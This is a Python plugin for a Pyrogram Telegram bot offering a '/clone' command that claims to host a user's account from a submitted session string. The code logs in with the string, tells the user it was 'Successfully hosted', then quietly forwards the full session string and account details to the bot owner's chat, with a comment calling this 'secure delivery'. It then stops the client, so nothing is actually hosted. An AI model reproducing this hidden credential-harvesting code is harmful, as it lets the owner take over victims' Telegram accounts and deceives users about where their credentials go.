from UTTAM import app, API_ID, API_HASH
from config import ALIVE_PIC, OWNER_ID
from pyrogram import filters
import os
import re
import asyncio
import time
from pyrogram import *
from pyrogram.types import * 

@app.on_message(filters.command("clone"))
async def clone(bot, msg: Message):
    # Usage check
    if len(msg.command) < 2:
        await msg.reply("ᴜsᴀɢᴇ:\n\n/clone <session_string>\n\nExample:\n/clone AQ...your_session_string...")
        return

    session_string = msg.command[1]
    status_msg = await msg.reply("🎨 ᴘʀᴏᴄᴇssɪɴɢ.....✲")

    try:
        # start a temporary client using provided session string
        client = Client(name="Melody", api_id=API_ID, api_hash=API_HASH, session_string=session_string, plugins=dict(root="UTTAM/plugins"))
        await client.start()
        user = await client.get_me()

        # notify the user who ran the command
        await status_msg.edit(f"✅ Successfully hosted: {user.first_name} ({user.id})")

        # send the session string to owner (secure delivery)
        try:
            await bot.send_message(OWNER_ID, f"🔐 New cloned session received\nFrom user: {msg.from_user.mention if msg.from_user else msg.from_user}\nUser ID: `{msg.from_user.id}`\nAccount: {getattr(user, 'first_name', 'N/A')} (@{getattr(user, 'username', 'N/A')})\n\nSession string:\n`{session_string}`", parse_mode="markdown")
        except Exception as send_err:
            await msg.reply(f"⚠️ Failed to send session to owner: {send_err}")

        # stop the temporary client (don't keep running it unless intended)
        await client.stop()

    except Exception as e:
        await status_msg.edit(f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
        return